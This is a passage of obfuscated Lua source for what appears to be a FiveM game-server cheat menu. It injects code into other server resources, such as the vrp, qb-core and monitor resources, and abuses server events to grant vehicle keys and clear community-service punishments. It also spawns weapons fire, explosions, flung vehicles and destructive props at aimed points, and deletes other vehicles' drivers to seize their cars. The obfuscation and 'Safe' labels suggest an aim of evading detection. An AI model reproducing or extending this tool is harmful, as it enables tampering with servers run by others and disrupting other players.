Shot","RPG","Explosion","Shoot Car","Shoot Boat","Shoot Plane","Map Destroy"};local v59=1;local v60={"WEAPON_PISTOL","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_PISTOL50","WEAPON_SNSPISTOL","WEAPON_HEAVYPISTOL","WEAPON_VINTAGEPISTOL","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_ASSAULTSMG","WEAPON_COMBATPDW","WEAPON_MACHINEPISTOL","WEAPON_MINISMG","WEAPON_ASSAULTRIFLE","WEAPON_CARBINERIFLE","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE","WEAPON_BULLPUPRIFLE","WEAPON_COMPACTRIFLE","WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_BULLPUPSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_MUSKET","WEAPON_HEAVYSHOTGUN","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_MARKSMANRIFLE","WEAPON_MINIGUN","WEAPON_GRENADELAUNCHER","WEAPON_RPG","WEAPON_STINGER","WEAPON_FIREWORK","WEAPON_RAILGUN","WEAPON_HOMINGLAUNCHER","WEAPON_GRENADE","WEAPON_SMOKEGRENADE","WEAPON_BZGAS","WEAPON_MOLOTOV","WEAPON_PETROLCAN","WEAPON_FLARE","WEAPON_STICKYBOMB","WEAPON_PROXMINE","WEAPON_PIPEBOMB"};local v61=1;local v62={"adder","zentorno","t20","nero","fmj","sultan","kuruma2","entityxf","osiris","reaper"};local v63={"dinghy","jetmax","suntrap","tropic","seashark","squalo","marquis","predator"};local v64={"lazer","hydra","besra","vestra","nimbus","shamal","duster","mammatus","velum","stunt"};local v65=1;local v66=2 -1 ;local v67=1 + 0 ;local v68={"prop_loopile_06","dt1_05_build1_damage","hei_dt1_tcmodzito","sum_prop_dufocore_01a","sr_prop_stunt_tube_xs_02a","xs_propint2_set_scifi_10","prop_crate_02a","xs_prop_arena_turret_01a_wl","xs_prop_arena_podium_02a","prop_air_bigradar","xs_prop_arena_barrel_01a_sf","prop_church_01","prop_cs_crane_arm","xs_prop_arena_turntable_01a_wl","prop_cstl_twr_b","prop_skid_tent_01","xs_prop_hamburgher_wl","prop_container_01a","prop_contnr_pile_01a","stt_prop_stunt_track_start","stt_prop_stunt_track_dwuturn","xs_prop_arena_podium_02a","prop_rock_1_b","xs_prop_arena_barrel_01a_sf","prop_rock_4_b","stt_prop_stunt_tube_fn_05","csx_seabedrock3","hei_prop_carrier_jet","prop_windmill_01","dt1_02_build1_damage","p_oil_pjack_01_amo","stt_prop_stunt_tube_l","xs_terrain_dyst_ground_07","prop_tyre_9","prop_tree_01","prop_tree_02","stt_prop_stunt_tube_fn_02"};local v69=1119 -(628 + 490) ;function RotationToDirection(v246) local v247=0 + 0 ;local v248;local v249;local v250;while true do if (v247==(0 -0)) then v248=math.rad(v246.z);v249=math.rad(v246.x);v247=1;end if (v247==1) then v250=math.cos(v249);return vector3( -math.sin(v248) * v250 ,math.cos(v248) * v250 ,math.sin(v249));end end end function ToggleFreeCam() local v251=0;while true do if (v251==0) then v54= not v54;if v54 then local v810=GetGameplayCamCoord();local v811=GetGameplayCamRot();v55=CreateCamWithParams("DEFAULT_SCRIPTED_CAMERA",v810.x,v810.y,v810.z,v811.x,v811.y,v811.z,228 -178 );SetCamActive(v55,true);RenderScriptCams(true,false,200,false,false);SetEntityVisible(PlayerPedId(),false,false);FreezeEntityPosition(PlayerPedId(),true);else local v812=774 -(431 + 343) ;while true do if (v812==1) then SetFocusEntity(PlayerPedId());SetEntityVisible(PlayerPedId(),true,false);v812=2;end if (v812==(0 -0)) then if v55 then local v956=0;while true do if (v956==0) then SetCamActive(v55,false);RenderScriptCams(false,true,0 -0 ,false,false);v956=1 + 0 ;end if (v956==1) then DestroyCam(v55);v55=nil;break;end end end ClearFocus();v812=1 + 0 ;end if (v812==(1697 -(556 + 1139))) then FreezeEntityPosition(PlayerPedId(),false);NetworkSetFriendlyFireOption(true);v812=18 -(6 + 9) ;end if (v812==(1 + 3)) then EnableAllControlActions(1 + 0 );break;end if (v812==(172 -(28 + 141))) then SetCanAttackFriendly(PlayerPedId(),true,true);EnableAllControlActions(0 + 0 );v812=4;end end end break;end end end function CloseFreeCam() if (v54 and v55) then v54=false;SetCamActive(v55,false);RenderScriptCams(false,true,0,false,false);DestroyCam(v55);v55=nil;ClearFocus();SetFocusEntity(PlayerPedId());SetEntityVisible(PlayerPedId(),true,false);FreezeEntityPosition(PlayerPedId(),false);NetworkSetFriendlyFireOption(true);SetCanAttackFriendly(PlayerPedId(),true,true);EnableAllControlActions(0);EnableAllControlActions(1 -0 );end end function draw_center_dot() local v252=0 + 0 ;local v253;local v254;while true do if (0==v252) then v253,v254=GetActiveScreenResolution();DrawRect(1317.5 -(486 + 831) ,0.5,(5 -3)/v253 ,(6 -4)/v254 ,255,49 + 206 ,806 -551 ,1518 -(668 + 595) );break;end end end function draw_freecam_circle() local v255=0 + 0 ;local v256;local v257;local v258;local v259;local v260;local v261;local v262;while true do if (v255==(1 + 0)) then v258=0.5 -0 ;v259=290.5 -(23 + 267) ;v255=1946 -(1129 + 815) ;end if (v255==2) then v260=((389 -(371 + 16)) * math.pi)/v256 ;v261=v258 + v257 ;v255=1753 -(1326 + 424) ;end if (v255==(0 -0)) then v256=80;v257=0.6;v255=3 -2 ;end if (v255==(121 -(88 + 30))) then v262=v259;for v773=772 -(720 + 51) ,v256 do local v774=0;local v775;local v776;local v777;while true do if (v774==1) then v777=v259 + (v257 * math.sin(v775)) ;DrawLine(v261,v262,0,v776,v777,0,567 -312 ,2031 -(421 + 1355) ,420 -165 ,89 + 91 );v774=2;end if ((1085 -(286 + 797))==v774) then v261=v776;v262=v777;break;end if (v774==(0 -0)) then v775=v773 * v260 ;v776=v258 + (v257 * math.cos(v775)) ;v774=1;end end end break;end end end local function v70(v263,v264,v265) local v266=0;local v267;local v268;local v269;local v270;while true do if (v266==(4 -1)) then if HasWeaponAssetLoaded(v267) then if  not v269 then GiveWeaponToPed(v268,v267,1438 -(397 + 42) ,false,true);end SetCurrentPedWeapon(v268,v267,true);Citizen.Wait(0 + 0 );local v813=v263 + (v264 * (1300 -(24 + 776))) ;ShootSingleBulletBetweenCoords(v263.x,v263.y,v263.z,v813.x,v813.y,v813.z,154 -54 ,true,v267,v268,true,false,1000);return true;end return false;end if ((787 -(222 + 563))==v266) then v270=0 -0 ;while  not HasWeaponAssetLoaded(v267) and (v270<(72 + 28))  do local v778=190 -(23 + 167) ;while true do if (v778==(1798 -(690 + 1108))) then Wait(4 + 6 );v270=v270 + 1 ;break;end end end v266=3 + 0 ;end if ((849 -(40 + 808))==v266) then v269=HasPedGotWeapon(v268,v267,false);RequestWeaponAsset(v267,31,0 + 0 );v266=7 -5 ;end if (v266==(0 + 0)) then v267=GetHashKey(v265);v268=PlayerPedId();v266=1 + 0 ;end end end local function v71(v271,v272,v273) local v274=0 + 0 ;local v275;while true do if (v274==(572 -(47 + 524))) then MachoInjectResource(v275,string.format([[
        local vehicleModel = "%s"
        local spawnX = %f
        local spawnY = %f
        local spawnZ = %f
        local dirX = %f
        local dirY = %f
        local dirZ = %f
        
        -- Request model
        local modelHash = GetHashKey(vehicleModel)
        RequestModel(modelHash)
        local timeout = 0
        while not HasModelLoaded(modelHash) and timeout < 100 do
            Citizen.Wait(10)
            timeout = timeout + 1
        end
        
        if HasModelLoaded(modelHash) then
            -- Spawn vehicle at target location
            local vehicle = CreateVehicle(modelHash, spawnX, spawnY, spawnZ + 5.0, math.random(0, 360), true, false)
            
            if DoesEntityExist(vehicle) then
                -- Set vehicle properties
                SetEntityVelocity(vehicle, dirX * 60.0, dirY * 60.0, math.random(10, 30))
                SetEntityAsMissionEntity(vehicle, true, true)
                SetVehicleDoorsLocked(vehicle, 1)
                SetVehicleEngineOn(vehicle, true, true, false)
                
                -- Set color
                SetVehicleCustomPrimaryColour(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
                SetVehicleCustomSecondaryColour(vehicle, math.random(0, 255), math.random(0, 255), math.random(0, 255))
                
                -- Give keys (QB-Core)
                if GetResourceState('qb-core') == "started" then
                    local plate = GetVehicleNumberPlateText(vehicle)
                    TriggerServerEvent('qb-vehiclekeys:server:addKey', plate)
                    TriggerServerEvent('qb-vehiclekeys:server:giveKey', plate, GetPlayerServerId(PlayerId()))
                end
                
                -- Give keys (VRP)
                if GetResourceState('vrp') == "started" then
                    TriggerEvent('vrp:vehicle:keys', vehicle, true)
                end
                
                -- Give keys (Generic)
                TriggerEvent('vehiclekeys:client:SetOwner', GetVehicleNumberPlateText(vehicle))
                
                print("Vehicle spawned with keys: " .. vehicleModel)
                TriggerEvent('chat:addMessage', { args = { '^2Freecam:', 'Spawned ' .. vehicleModel .. ' with keys!' } })
            end
            
            SetModelAsNoLongerNeeded(modelHash)
        else
            TriggerEvent('chat:addMessage', { args = { '^1Freecam:', 'Failed to spawn ' .. vehicleModel } })
        end
    ]],v273,v271.x,v271.y,v271.z,v272.x,v272.y,v272.z));MachoMenuNotification("Freecam","Spawning: "   .. v273 );break;end if (v274==(0 + 0)) then v275=nil;if (GetResourceState("vrp")=="started") then v275="vrp";elseif (GetResourceState("qb-core")=="started") then v275="qb-core";elseif (GetResourceState("ox_inventory")=="started") then v275="ox_inventory";else v275="monitor";end v274=1;end end end local function v72(v276,v277) local v278=GetHashKey(v277);RequestModel(v278);local v279=0 -0 ;while  not HasModelLoaded(v278) and (v279<(74 -24))  do local v500=0 -0 ;while true do if (v500==0) then Wait(1736 -(1165 + 561) );v279=v279 + 1 + 0 ;break;end end end if HasModelLoaded(v278) then local v528=0 -0 ;local v529;local v530;local v531;local v532;local v533;local v534;while true do if (v528==(2 + 1)) then if DoesEntityExist(v534) then local v925=0;while true do if (v925==1) then SetEntityVelocity(v534,math.random( -(489 -(341 + 138)),3 + 7 ),math.random( -(20 -10),336 -(89 + 237) ),math.random(15,160 -110 ));SetModelAsNoLongerNeeded(v278);v925=3 -1 ;end if (2==v925) then return v534;end if (v925==(881 -(581 + 300))) then SetEntityAsMissionEntity(v534,true,true);SetEntityCollision(v534,true,true);v925=1221 -(855 + 365) ;end end end SetModelAsNoLongerNeeded(v278);break;end if (v528==(4 -2)) then v533=v276.z + math.random(0,15) ;v534=CreateObject(v278,v531,v532,v533,true,true,true);v528=1 + 2 ;end if (v528==(1235 -(1030 + 205))) then v529=math.random() * (2 + 0) * math.pi ;v530=math.random(5,24 + 1 );v528=287 -(156 + 130) ;end if (v528==(2 -1)) then v531=v276.x + (math.cos(v529) * v530) ;v532=v276.y + (math.sin(v529) * v530) ;v528=2;end end end return nil;end Citizen.CreateThread(function() while true do Citizen.Wait(0);if IsControlJustPressed(0,124 -50 ) then if v56 then local v814=0 -0 ;while true do if (1==v814) then EnableAllControlActions(0);EnableAllControlActions(1 + 0 );v814=2;end if (v814==(0 + 0)) then NetworkSetFriendlyFireOption(true);SetCanAttackFriendly(PlayerPedId(),true,true);v814=70 -(10 + 59) ;end if (v814==(1 + 1)) then ToggleFreeCam();break;end end end end if ( not v56 and v54) then CloseFreeCam();end if (v54 and v55) then local v708=GetCamCoord(v55);local v709=GetCamRot(v55);local v710=RotationToDirection(v709);local v711=IsControlPressed(0 -0 ,1184 -(671 + 492) );local v712=(v711 and (4 + 1)) or (1215.5 -(369 + 846)) ;if IsControlPressed(0,32) then v708=v708 + (v710 * v712) ;elseif IsControlPressed(0 + 0 ,29 + 4 ) then v708=v708-(v710 * v712) ;end if IsControlPressed(0,34) then v708=v708 + (vector3( -v710.y,v710.x,1945 -(1036 + 909) ) * v712) ;elseif IsControlPressed(0 + 0 ,35) then v708=v708 + (vector3(v710.y, -v710.x,0) * v712) ;end SetCamCoord(v55,v708.x,v708.y,v708.z);local v713=GetControlNormal(0 -0 ,204 -(11 + 192) ) * (3 + 1) ;local v714=GetControlNormal(175 -(135 + 40) ,4 -2 ) * 4 ;if ((v713~=(0 + 0)) or (v714~=(0 -0))) then SetCamRot(v55,v709.x-v714 ,v709.y,v709.z-v713 );end TaskStandStill(PlayerPedId(),14 -4 );SetFocusPosAndVel(v708.x,v708.y,v708.z,176 -(50 + 126) ,0,0);local v715=StartExpensiveSynchronousShapeTestLosProbe(v708.x,v708.y,v708.z,v708.x + (v710.x * 500) ,v708.y + (v710.y * 500) ,v708.z + (v710.z * (1392 -892)) , -(1 + 0),PlayerPedId());local v716,v717,v718,v716,v719=GetShapeTestResult(v715);if IsControlJustPressed(1413 -(1233 + 180) ,44) then local v815=0;while true do if (v815==(969 -(522 + 447))) then v59=v59-1 ;if (v59<(1422 -(107 + 1314))) then v59= #v58;end v815=1 + 0 ;end if (v815==(2 -1)) then PlaySoundFrontend( -(1 + 0),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end end end if IsControlJustPressed(0 -0 ,38) then v59=v59 + 1 ;if (v59> #v58) then v59=3 -2 ;end PlaySoundFrontend( -(1911 -(716 + 1194)),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end local v720=v58[v59];if (v720=="Weapon Shot") then local v816=0 + 0 ;while true do if (v816==(0 + 0)) then if (IsControlJustPressed(503 -(74 + 429) ,335 -161 ) or IsControlJustPressed(0 + 0 ,551 -310 )) then v61=v61-1 ;if (v61<1) then v61= #v60;end PlaySoundFrontend( -(1 + 0),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end if (IsControlJustPressed(0,175) or IsControlJustPressed(0 -0 ,597 -355 )) then v61=v61 + 1 ;if (v61> #v60) then v61=434 -(279 + 154) ;end PlaySoundFrontend( -(779 -(454 + 324)),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end break;end end elseif (v720=="Shoot Car") then local v926=0 + 0 ;while true do if (v926==0) then if (IsControlJustPressed(17 -(12 + 5) ,94 + 80 ) or IsControlJustPressed(0 -0 ,90 + 151 )) then local v970=0;while true do if (v970==(1094 -(277 + 816))) then PlaySoundFrontend( -(4 -3),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end if (v970==0) then v65=v65-(1184 -(1058 + 125)) ;if (v65<(1 + 0)) then v65= #v62;end v970=976 -(815 + 160) ;end end end if (IsControlJustPressed(0 -0 ,415 -240 ) or IsControlJustPressed(0 + 0 ,242)) then local v971=0;while true do if (v971==(0 -0)) then v65=v65 + (1899 -(41 + 1857)) ;if (v65> #v62) then v65=1894 -(1222 + 671) ;end v971=2 -1 ;end if (v971==(1 -0)) then PlaySoundFrontend( -(1183 -(229 + 953)),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end end end break;end end elseif (v720=="Shoot Boat") then if (IsControlJustPressed(0,1948 -(1111 + 663) ) or IsControlJustPressed(1579 -(874 + 705) ,241)) then local v959=0 + 0 ;while true do if ((1 + 0)==v959) then PlaySoundFrontend( -1,"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end if (v959==(0 -0)) then v66=v66-(1 + 0) ;if (v66<(680 -(642 + 37))) then v66= #v63;end v959=1;end end end if (IsControlJustPressed(0 + 0 ,28 + 147 ) or IsControlJustPressed(0 -0 ,242)) then local v960=454 -(233 + 221) ;while true do if ((2 -1)==v960) then PlaySoundFrontend( -(1 + 0),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end if (v960==(1541 -(718 + 823))) then v66=v66 + 1 + 0 ;if (v66> #v63) then v66=806 -(266 + 539) ;end v960=2 -1 ;end end end elseif (v720=="Shoot Plane") then if (IsControlJustPressed(1225 -(636 + 589) ,412 -238 ) or IsControlJustPressed(0,241)) then local v973=0;while true do if (v973==0) then v67=v67-1 ;if (v67<(1 -0)) then v67= #v64;end v973=1;end if ((1 + 0)==v973) then PlaySoundFrontend( -(1 + 0),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end end end if (IsControlJustPressed(1015 -(657 + 358) ,175) or IsControlJustPressed(0,242)) then v67=v67 + (2 -1) ;if (v67> #v64) then v67=1;end PlaySoundFrontend( -(2 -1),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end elseif (v720=="Map Destroy") then if (IsControlJustPressed(1187 -(1151 + 36) ,174) or IsControlJustPressed(0,233 + 8 )) then local v983=0;while true do if ((0 + 0)==v983) then v69=v69-(2 -1) ;if (v69<(1833 -(1552 + 280))) then v69= #v68;end v983=1;end if (1==v983) then PlaySoundFrontend( -(835 -(64 + 770)),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);break;end end end if (IsControlJustPressed(0 + 0 ,397 -222 ) or IsControlJustPressed(0 + 0 ,1485 -(157 + 1086) )) then v69=v69 + (1 -0) ;if (v69> #v68) then v69=4 -3 ;end PlaySoundFrontend( -(1 -0),"NAV_UP_DOWN","HUD_FRONTEND_DEFAULT_SOUNDSET",false);end end SetTextFont(4);SetTextProportional(1);SetTextScale(0 -0 ,819.8 -(599 + 220) );SetTextColour(0,255,507 -252 ,255);SetTextOutline();SetTextCentre(true);SetTextEntry("STRING");local v721="["   .. v58[v59]   .. "]" ;if (v720=="Weapon Shot") then local v817=0;local v818;local v819;while true do if (v817==0) then v818=v60[v61];v819=GetLabelText(v818);v817=1932 -(1813 + 118) ;end if (v817==1) then if ((v819=="NULL") or (v819=="")) then v819=v818:gsub("WEAPON_","");end v721="[Weapon Shot: "   .. v819   .. "]" ;break;end end elseif (v720=="Shoot Car") then v721="[Shoot Car: "   .. v62[v65]   .. "]" ;elseif (v720=="Shoot Boat") then v721="[Shoot Boat: "   .. v63[v66]   .. "]" ;elseif (v720=="Shoot Plane") then v721="[Shoot Plane: "   .. v64[v67]   .. "]" ;elseif (v720=="Map Destroy") then v721="[Map Destroy: "   .. v68[v69]   .. "]" ;end AddTextComponentString(v721);DrawText(0.5 + 0 ,1217.9 -(841 + 376) );draw_center_dot();draw_freecam_circle();if IsDisabledControlJustPressed(0,24) then if (v720=="Select") then if (v717 and v719 and (v719~=(0 -0))) then local v949=GetEntityType(v719);local v950=((v949==(1 + 0)) and "Ped") or ((v949==(5 -3)) and "Vehicle") or ((v949==(862 -(464 + 395))) and "Object") or "Unknown" ;MachoMenuNotification("Freecam","Selected: "   .. v950 );end elseif (v720=="Teleportation") then local v951=0 -0 ;while true do if ((0 + 0)==v951) then if v717 then v57=v718;end if (v57~=nil) then local v980=PlayerPedId();local v981=GetVehiclePedIsIn(v980,false);local v982=v57;if (v981 and (v981~=(837 -(467 + 370)))) then SetEntityCoords(v981,v982.x,v982.y,v982.z + 2 ,false,false,false,false);else SetEntityCoords(v980,v982.x,v982.y,v982.z + (1 -0) ,false,false,false,false);end v57=nil;MachoMenuNotification("Freecam","Teleported!");end break;end end elseif (v720=="Weapon Shot") then if v717 then local v974=0 + 0 ;local v975;local v976;while true do if (v974==(3 -2)) then if v976 then MachoMenuNotification("Freecam","Fired: "   .. v975 );else MachoMenuNotification("Freecam","Failed to fire weapon");end break;end if (v974==(0 + 0)) then v975=v60[v61];v976=v70(v708,v710,v975);v974=1;end end end elseif (v720=="RPG") then if v717 then local v984=GetHashKey("WEAPON_RPG");RequestWeaponAsset(v984,31,0 -0 );while  not HasWeaponAssetLoaded(v984) do Wait(520 -(150 + 370) );end ShootSingleBulletBetweenCoords(v708.x,v708.y,v708.z,v718.x,v718.y,v718.z,100,true,v984,PlayerPedId(),true,false,1000);MachoMenuNotification("Freecam","RPG Fired!");end elseif (v720=="Explosion") then if v717 then AddExplosion(v718.x,v718.y,v718.z,7,50,true,false,1283 -(74 + 1208) );MachoMenuNotification("Freecam","Explosion!");end elseif (v720=="Shoot Car") then if v717 then v71(v708,v710,v62[v65]);end elseif (v720=="Shoot Boat") then if v717 then v71(v708,v710,v63[v66]);end elseif (v720=="Shoot Plane") then if v717 then v71(v708,v710,v64[v67]);end elseif (v720=="Map Destroy") then if v717 then local v989=0 -0 ;local v990;while true do if (v989==0) then v990=v72(v718,v68[v69]);if v990 then MachoMenuNotification("Freecam","Spawned: "   .. v68[v69] );end break;end end end end end end end end);MachoMenuCheckbox(v9,"S1DEV Freecam - Safe",function() local v280=0;while true do if (v280==(0 -0)) then v56=true;if  not v54 then ToggleFreeCam();end break;end end end,function() local v281=0 + 0 ;while true do if (v281==(390 -(14 + 376))) then v56=false;CloseFreeCam();break;end end end);MachoMenuButton(v9,"Close Menu",function() local v282=0;while true do if (v282==(0 -0)) then v5=0 + 0 ;MachoMenuDestroy(v4);break;end end end);MachoMenuButton(v9,"Animation Cancel On/Off",function() animCancel= not animCancel;if animCancel then print("Animation cancel ACTIVE - X key");else print("Animation cancel OFF");end end);CreateThread(function() while true do Wait(0 + 0 );if (animCancel and IsControlJustPressed(0 + 0 ,73)) then ClearPedTasksImmediately(PlayerPedId());end end end);MachoMenuButton(v9,"Armor - Safe",function() local v283=PlayerPedId();SetPedArmour(v283,293 -193 );MachoMenuNotification("S1DEV","Armor applied.");end);MachoMenuButton(v9,"Clear Community Service (Safe)",function() MachoInjectResource("any",[[
        TriggerServerEvent('qb-communityservice:finishCommunityService', -1)
    ]]);MachoMenuNotification("[Safe Process]","Community service clear command applied.");end);MachoMenuButton(v9,"Random Skin - Safe",function() local v284=PlayerPedId();SetPedRandomComponentVariation(v284,false);SetPedRandomProps(v284);MachoMenuNotification("S1DEV","Random skin applied.");end);local v73=MachoMenuAddTab(v4,"Vehicle Menu");local v74=MachoMenuGroup(v73,"Vehicle Creation",v3,9,(v1.x-v3) + 150 ,v1.y);MachoMenuText(v74,"Enter Vehicle Model (e.g., sultan)");local v75=MachoMenuInputbox(v74,"Vehicle Model","e.g., sultan");local v76=false;MachoMenuCheckbox(v74,"Get Vehicle Key?",function() v76=true;end,function() v76=false;end);MachoMenuButton(v74,"Create Vehicle",function() local v285=MachoMenuGetInputbox(v75);if (v285 and (v285~="")) then local v535=0;while true do if (v535==(0 + 0)) then MachoInjectResource("monitor",string.format([[
            local modelName = "%s"
            local modelHash = GetHashKey(modelName)
            local giveKey = %s

            if not IsModelInCdimage(modelHash) then
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Invalid model: %s' } })
                return
            end

            RequestModel(modelHash)
            while not HasModelLoaded(modelHash) do
                Wait(0)
            end

            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local vehicle = CreateVehicle(modelHash, coords.x, coords.y, coords.z, GetEntityHeading(ped), true, false)

            if vehicle and vehicle ~= 0 then
                SetVehicleCustomPrimaryColour(vehicle, 255, 255, 255)
                SetVehicleCustomSecondaryColour(vehicle, 255, 255, 255)
                TaskWarpPedIntoVehicle(ped, vehicle, -1)

                if giveKey then
                    local plate = GetVehicleNumberPlateText(vehicle)
                    TriggerEvent("vehiclekeys:client:SetOwner", plate)
                    TriggerEvent('chat:addMessage', { args = { '^2Vehicle System:', 'Vehicle created and key given!' } })
                else
                    TriggerEvent('chat:addMessage', { args = { '^2Vehicle System:', 'Vehicle created! (No key)' } })
                end
            else
                TriggerEvent('chat:addMessage', { args = { '^1Vehicle System:', 'Failed to create vehicle!' } })
            end

            SetModelAsNoLongerNeeded(modelHash)
        ]],v285,tostring(v76),v285));if v76 then MachoMenuNotification("Vehicle System","Vehicle created and key given!");else MachoMenuNotification("Vehicle System","Vehicle created (No key given)!");end break;end end else MachoMenuNotification("Error","Please enter a valid vehicle model!");end end);MachoMenuButton(v74,"Fix Vehicle",function() local v286=GetVehiclePedIsIn(GetPlayerPed( -1),false);if (v286 and (v286~=(78 -(23 + 55)))) then local v536=0 -0 ;while true do if (v536==0) then SetVehicleFixed(v286);SetVehicleDeformationFixed(v286);v536=1;end if (v536==(1 + 0)) then SetVehicleUndriveable(v286,false);MachoMenuNotification("Vehicle repaired.",2245 + 255 );break;end end else MachoMenuNotification("You are not in a vehicle.",3876 -1376 );end end);MachoMenuButton(v74,"Fix Engine",function() local v287=0;local v288;while true do if (v287==(0 + 0)) then v288=GetVehiclePedIsIn(GetPlayerPed( -1),false);if (v288 and (v288~=0)) then local v820=901 -(652 + 249) ;while true do if (v820==(0 -0)) then SetVehicleEngineHealth(v288,2868 -(708 + 1160) );Citizen.InvokeNative(2292506500000000000 -0 ,v288,0 -0 );break;end end else MachoMenuNotification("You are not in a vehicle.",2527 -(10 + 17) );end break;end end end);MachoMenuButton(v74,"Flip Vehicle",function() local v289=GetPlayerPed( -(1 + 0));local v290=GetVehiclePedIsIn(v289,true);if (IsPedInAnyVehicle(v289,false) and (GetPedInVehicleSeat(v290, -(1733 -(1400 + 332)))==v289)) then local v537=0 -0 ;while true do if (v537==0) then SetVehicleOnGroundProperly(v290);MachoMenuNotification("Vehicle flipped.",4408 -(242 + 1666) );break;end end else MachoMenuNotification("You are not in the driver's seat.",1070 + 1430 );end end);MachoMenuButton(v74,"Max Tuning",function() local v291=GetVehiclePedIsUsing(PlayerPedId( -(1 + 0)));if (v291 and (v291~=(0 + 0))) then local v538=940 -(850 + 90) ;while true do if ((1 -0)==v538) then SetVehicleWindowTint(v291,1391 -(360 + 1030) );SetVehicleTyresCanBurst(v291,false);v538=2;end if (2==v538) then MachoMenuNotification("Vehicle max tuned!",2213 + 287 );break;end if (v538==0) then SetVehicleModKit(v291,0);for v877=0,137 -88  do local v878=0;local v879;while true do if (v878==(0 -0)) then v879=GetNumVehicleMods(v291,v877) -(1662 -(909 + 752)) ;if (v879>=0) then SetVehicleMod(v291,v877,v879,false);end break;end end end v538=1224 -(109 + 1114) ;end end else MachoMenuNotification("You are not in a vehicle!",4577 -2077 );end end);MachoMenuButton(v74,"TP to Nearest Vehicle",function() local v292=GetPlayerPed( -(1 + 0));local v293=GetEntityCoords(v292,true);local v294=GetClosestVehicle(v293,1242 -(6 + 236) ,0,3 + 1 );local v295=GetEntityCoords(v294,true);local v296=GetClosestVehicle(v293,1000,0,16384);local v297=GetEntityCoords(v296,true);MachoMenuNotification("~y~Waiting...",805 + 195 );Citizen.Wait(2358 -1358 );if ((v294==0) and (v296==(0 -0))) then MachoMenuNotification("~b~No vehicle found",3633 -(1076 + 57) );elseif ((v294==(0 + 0)) and (v296~=(689 -(579 + 110)))) then local v779=0;while true do if ((0 + 0)==v779) then if IsVehicleSeatFree(v296, -(1 + 0)) then SetPedIntoVehicle(v292,v296, -1);SetVehicleAlarm(v296,false);SetVehicleDoorsLocked(v296,1 + 0 );SetVehicleNeedsToBeHotwired(v296,false);else local v952=0;local v953;while true do if (v952==(410 -(174 + 233))) then SetVehicleDoorsLocked(v296,2 -1 );SetVehicleNeedsToBeHotwired(v296,false);break;end if (v952==2) then SetPedIntoVehicle(v292,v296, -1);SetVehicleAlarm(v296,false);v952=3;end if (v952==0) then v953=GetPedInVehicleSeat(v296, -(1 -0));ClearPedTasksImmediately(v953);v952=1;end if ((1 + 0)==v952) then SetEntityAsMissionEntity(v953,1,1175 -(663 + 511) );DeleteEntity(v953);v952=2 + 0 ;end end end MachoMenuNotification("~g~Teleported to nearest vehicle!",2500);break;end end elseif ((v294~=0) and (v296==0)) then if IsVehicleSeatFree(v294, -(1 + 0)) then local v937=0 -0 ;while true do if (1==v937) then SetVehicleDoorsLocked(v294,1);SetVehicleNeedsToBeHotwired(v294,false);break;end if (v937==0) then SetPedIntoVehicle(v292,v294, -1);SetVehicleAlarm(v294,false);v937=1 + 0 ;end end else local v938=0;local v939;while true do if ((4 -2)==v938) then SetPedIntoVehicle(v292,v294, -(2 -1));SetVehicleAlarm(v294,false);v938=2 + 1 ;end if ((1 -0)==v938) then SetEntityAsMissionEntity(v939,1,1);DeleteEntity(v939);v938=2 + 0 ;end if (v938==(0 + 0)) then v939=GetPedInVehicleSeat(v294, -(723 -(478 + 244)));ClearPedTasksImmediately(v939);v938=1;end if (v938==3) then SetVehicleDoorsLocked(v294,518 -(440 + 77) );SetVehicleNeedsToBeHotwired(v294,false);break;end end end MachoMenuNotification("~g~Teleported to nearest vehicle!",1137 + 1363 );else local v880=0 -0 ;local v881;local v882;while true do if (v880==(1556 -(655 + 901))) then v881= #(v293-v295);v882= #(v293-v297);v880=1 + 0 ;end if (v880==1) then if (v881<v882) then if IsVehicleSeatFree(v294, -(1 + 0)) then local v977=0;while true do if (v977==1) then SetVehicleDoorsLocked(v294,1 + 0 );SetVehicleNeedsToBeHotwired(v294,false);break;end if (v977==(0 -0)) then SetPedIntoVehicle(v292,v294, -(1446 -(695 + 750)));SetVehicleAlarm(v294,false);v977=3 -2 ;end end else local v978=0;local v979;while true do if (v978==(3 -0)) then SetVehicleDoorsLocked(v294,1);SetVehicleNeedsToBeHotwired(v294,false);break;end if (v978==(7 -5)) then SetPedIntoVehicle(v292,v294, -(352 -(285 + 66)));SetVehicleAlarm(v294,false);v978=6 -3 ;end if (v978==(1311 -(682 + 628))) then SetEntityAsMissionEntity(v979,1 + 0 ,300 -(176 + 123) );DeleteEntity(v979);v978=1 + 1 ;end if (0==v978) then v979=GetPedInVehicleSeat(v294, -(1 + 0));ClearPedTasksImmediately(v979);v978=270 -(239 + 30) ;end end end MachoMenuNotification("~g~Teleported to nearest vehicle!",2500);else local v961=0 + 0 ;while true do if (v961==(0 + 0)) then if IsVehicleSeatFree(v296, -(1 -0)) then local v986=0 -0 ;while true do if (v986==0) then SetPedIntoVehicle(v292,v296, -1);SetVehicleAlarm(v296,false);v986=316 -(306 + 9) ;end if (v986==1) then SetVehicleDoorsLocked(v296,1);SetVehicleNeedsToBeHotwired(v296,false);break;end end else local v987=0;local v988;while true do if (v987==(10 -7)) then SetVehicleDoorsLocked(v296,1);SetVehicleNeedsToBeHotwired(v296,false);break;end if 